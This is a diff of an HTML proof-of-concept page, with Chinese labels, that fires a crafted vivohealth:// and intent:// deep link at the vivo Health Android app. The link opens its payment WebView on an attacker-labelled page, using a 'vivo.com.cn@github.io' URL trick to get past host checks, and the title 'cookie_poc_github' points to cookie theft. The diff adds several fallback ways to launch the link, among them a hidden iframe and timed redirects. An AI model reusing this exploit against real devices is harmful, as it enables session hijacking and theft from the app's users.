@@ -5,21 +5,19 @@
 
   <h3>vivo 健康公网触发</h3>
 
-  <button id="openScheme" style="font-size:20px;padding:14px 18px;margin:8px">
-    方式1：vivohealth 直跳
+  <button id="open" style="font-size:20px;padding:14px 18px;margin:8px">
+    点击触发 vivo 健康
   </button>
 
-  <button id="openIntent" style="font-size:20px;padding:14px 18px;margin:8px">
-    方式2：intent 跳转
-  </button>
+  <a id="direct" style="display:block;font-size:18px;margin:12px 8px">
+    备用：直接打开 scheme
+  </a>
 
-  <pre id="out" style="white-space:pre-wrap;word-break:break-
-  all;background:#111;color:#00ff8a;padding:12px"></pre>
+  <pre id="out" style="white-space:pre-wrap;word-break:break-all;background:#111;color:#00ff8a;padding:12px"></pre>
 
   <script>
   const attackerPage = 'https://vivopay.vivo.com.cn@allen10086.github.io/src.html';
 
-  // 先用你 ADB 里成功的 host：healthh5.vivo.com.cn
   const schemeUrl =
     'vivohealth://healthh5.vivo.com.cn/openApp' +
     '?to=pay_webview' +
@@ -33,14 +31,36 @@
     '&title=cookie_poc_github' +
     '#Intent;scheme=vivohealth;package=com.vivo.health;end';
 
+  document.getElementById('direct').href = schemeUrl;
   document.getElementById('out').textContent =
-    'schemeUrl:\\n' + schemeUrl + '\\n\\nintentUrl:\\n' + intentUrl;
+    'schemeUrl:\n' + schemeUrl + '\n\nintentUrl:\n' + intentUrl;
 
-  document.getElementById('openScheme').onclick = function () {
-    location.href = schemeUrl;
-  };
+  document.getElementById('open').addEventListener('click', function () {
+    document.getElementById('out').textContent += '\n\nclicked: ' + new Date().toISOString();
 
-  document.getElementById('openIntent').onclick = function () {
-    location.href = intentUrl;
-  };
+    // 1. 有些浏览器只认 window.open
+    try {
+      window.open(schemeUrl, '_self');
+    } catch (e) {}
+
+    // 2. 有些老 WebKit/厂商浏览器支持 iframe scheme
+    setTimeout(function () {
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = schemeUrl;
+        document.body.appendChild(iframe);
+      } catch (e) {}
+    }, 200);
+
+    // 3. Android Browser/Chrome 系浏览器更常支持 intent://
+    setTimeout(function () {
+      location.href = intentUrl;
+    }, 600);
+
+    // 4. 最后再试一次普通 scheme
+    setTimeout(function () {
+      location.href = schemeUrl;
+    }, 1200);
+  });
   </script>
